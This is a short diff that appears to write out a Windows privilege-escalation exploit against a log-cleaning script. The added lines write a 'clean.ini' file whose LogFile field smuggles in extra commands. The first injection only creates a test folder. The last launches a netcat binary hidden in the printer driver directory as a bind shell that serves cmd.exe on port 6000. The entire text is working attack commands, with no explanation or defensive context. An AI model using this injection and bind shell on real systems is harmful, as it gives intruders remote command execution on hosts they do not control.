@@ -1,0 +1,6 @@
+echo "[Main]" > c:\util\scripts\clean.ini
+echo "LifeTime=0" >> c:\util\scripts\clean.ini
+echo 'LogFile=c:\util\scripts\log.txt & cmd /c "mkdir c:\users\public\documents\adapooda"' >> c:\util\scripts\clean.ini
+echo "Directory=c:\inetpub\logs\logfiles" >> c:\util\scripts\clean.ini
+cmd /c "dir c:\users\public\documents"
+echo 'LogFile=c:\util\scripts\log.txt & cmd /c "mkdir c:\users\public\documents\executed & c:\windows\system32\spool\drivers\color\nc.exe -lvp 6000 -e cmd.exe"' >> c:\util\scripts\clean.ini
